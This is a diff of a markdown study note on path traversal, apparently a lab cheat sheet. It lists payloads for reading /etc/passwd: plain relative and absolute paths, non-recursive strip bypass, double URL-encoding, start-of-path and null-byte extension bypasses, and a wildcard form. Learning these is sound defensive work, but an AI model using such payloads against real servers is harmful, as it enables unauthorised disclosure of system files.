@@ -13,7 +13,7 @@ Path traversal is also known as directory traversal. These vulnerabilities enabl
 - try some LFI and RFI (will be discussed later on)
 
 ## How to exploit
-### File path traversal, simple case
+**1. File path traversal, simple case**
 - Determine whether the server is linux on win (make use of responses, use wapalizer extenstion)
 - try simple payload for relative path
 ```
@@ -24,27 +24,32 @@ filename=../../../../../../etc/passwd
 filename=/etc/passwd
 ```
 - so the functionality may be implemented using relative or absolute path 
-###  traversal sequences blocked with absolute path bypass
+**2.  traversal sequences blocked with absolute path bypass**
 - simply use absolute path 
 ```
 filename=/etc/passwd
 ```
-### traversal sequences stripped non-recursively
+**3. traversal sequences stripped non-recursively**
 - if ../ is sanitized non recursevly 
 ```
 filename=..././..././..././etc/passwd
 ```
-### traversal sequences stripped with superfluous URL-decode
+**4. traversal sequences stripped with superfluous URL-decode**
 - some times there is a client side validation, so do url encoding, and double it , it may bypass the defense 
-### validation of start of path
+
+**5. validation of start of path**
 ```
 filename=/var/www/images/../../../etc/passwd
 ```
-### validation of file extension with null byte bypass
+**6. validation of file extension with null byte bypass**
 - what is null byte ? 
 	- represent an end of a string 
 	- %00 
 	- when the server reads it, it will cut any thing after it
 ```
 filename=/etc/passwd%00.png
+```
+7. Make use of Wild Cards 
+```
+filename=/???/??ss?? => /etc/passwd
 ```
